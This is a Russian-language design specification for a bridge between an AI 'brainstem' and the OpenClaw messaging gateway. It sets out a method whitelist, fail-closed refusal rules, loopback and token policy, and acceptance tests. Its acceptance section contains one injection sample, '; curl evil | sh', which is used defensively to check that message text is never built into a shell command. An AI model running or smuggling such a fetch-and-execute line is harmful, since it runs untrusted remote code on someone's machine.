# SPEC-0008: Эффектор — OpenClaw как внешние руки

Статус: принято (спека до кода) · Версия: 0.1.0 · Дата: 2026-11-02 · ADR: ADR-0010

## 1. Назначение

ROADMAP M2: «Эффектор openclaw подключён за стволом мозга». openclaw — самый быстрорастущий
орган реестра (rank 6, 393 635 звёзд; MIT — верифицировано живым GitHub API 2026-11-02):
персональный gateway между моделями и каналами человека (Telegram, WhatsApp, Discord и др.).

Роль в организме — руки: доставлять импульсы ствола мозга в каналы, где живёт человек.
openclaw — **не второй ствол мозга**: он исполняет, но не решает. Воля — только у ствола
мозга (SPEC-0001); ответы канала входят в организм только как сенсорика следующего пульса.

Уроки органа входят в спеку как требования: CVE-2026-25253 (RCE) и 341 вредоносный навык
ClawHub (февраль 2026) показали цену свободной поверхности действия. Отсюда: auth обязательна
даже на loopback, поверхность эффекта — минимальный белый список методов, exec — только под
approvals человека.

## 2. Контракт

1. **Эффектор не встраивается.** Ни кода openclaw, ни npm-зависимостей в теле (SPEC-0006).
   Gateway живёт на хосте человека: развёртывание, токены, каналы, запуск — PID 1 (ADR-0006).
   Тело знает только адрес `${OPENCLAW_GATEWAY_URL}` и имя переменной токена.
2. **Мост — CLI, не самодельный протокол.** Документация протокола прямо запрещает hand-roll
   handshake клиентами вне официальных TS-пакетов. Организм вызывает
   `openclaw gateway call <method> --json` и никогда не строит строки shell: метод — из белого
   списка, параметры — структурированный dict, сериализуемый телом в один аргумент `--params`.
3. **Белый список методов:** `health`, `status`, `chat.send`, `chat.abort`. Расширение —
   только правкой этой спеки (G2: новая способность = строка спеки, не код).
4. **chat.send — закрытый объект:** `sessionKey` + `message` + `idempotencyKey` (неизвестные
   поля протокол отклоняет). `idempotencyKey` генерирует тело (uuid4) на каждый импульс —
   повторный пульс не дублирует сообщение человеку.
5. **Секреты не в теле.** Токен — только env-переменная на хосте человека
   (`OPENCLAW_GATEWAY_TOKEN`); в манифесте и артефактах — имя переменной, не значение.
   Данные-политика эффекта (`openclaw/reference/effector-policy.json`) требует
   `bind: loopback` и `exec_approval_required: true`; нарушения — отказ.
6. **Руки без воли.** Каждое действие эффектора — импульс от ствола мозга и конверт в крови
   (SPEC-0003; cost — длительность вызова: токенов у моста нет). Эффектор не инициирует
   импульсы и не формулирует смыслы.
7. **Человек = PID 1.** CI валидирует данные-политику и поведение моста на инъектируемом
   runner'е, не трогая сеть; живой вызов gateway — приёмка на хосте владельца.

## 3. Гарантии

- **G1 — fail-closed.** Метод вне белого списка → отказ **без запуска бинарника**; параметры
  не dict → отказ; бинарник не найден / rc != 0 / stdout не JSON → `binary-missing` /
  `call-failed` / `parse`. Валидатор политики: `missing`, `parse`, `structure`, `bind-open`,
  `auth-weak`, `method-unknown`, `exec-open`. Тихих пропусков нет.
- **G2 — артефакты — данные.** Смена канала/сессии/порта — правка политики-данных или env;
  новая способность — строка белого списка спеки; мост не знает ни одного метода сверх списка.
- **G3 — наблюдаемость.** Каждый `EffectorResult` несёт `rule` + причину по-русски; CLI:
  `OPENCLAW: ok <method>` / `OPENCLAW: FAIL (<rule>) <причина>`; валидатор:
  `POLICY: N ok, M failed`.

## 4. Отказные режимы

| Режим | Правило | Поведение |
| --- | --- | --- |
| Метод вне белого списка | `method-not-allowed` | отказ, runner не запускается |
| Параметры не объект | `params-type` | отказ, runner не запускается |
| Бинарника нет на хосте | `binary-missing` | отказ: живой gateway — у человека (PID 1) |
| Gateway вернул rc != 0 | `call-failed` | отказ с кодом выхода |
| stdout не JSON | `parse` | отказ |
| bind не loopback | `bind-open` | политика не принимается |
| Токен в данных (не имя env) | `auth-weak` | политика не принимается |
| exec без approvals | `exec-open` | политика не принимается |
| Неизвестный метод в политике | `method-unknown` | политика не принимается |

## 5. Приёмка

- Живая политика → `POLICY: 1 ok, 0 failed`; каждое нарушение таблицы §4 — красный PR.
- Метод вне списка → отказ без запуска runner'а.
- Инъекция в тексте сообщения (`; curl evil | sh`) остаётся данными JSON — shell не строится.
- `chat.send` уходит закрытым объектом с непустым `idempotencyKey`.
- Запись органа в `synapse/mcp-manifest.yaml`: tools отображаются в белый список 1:1.
- `commons-openclaw` в CI (job `effector`).
- Живой пульс через руки (gateway на хосте человека) — приёмка владельца, как у конвейера.
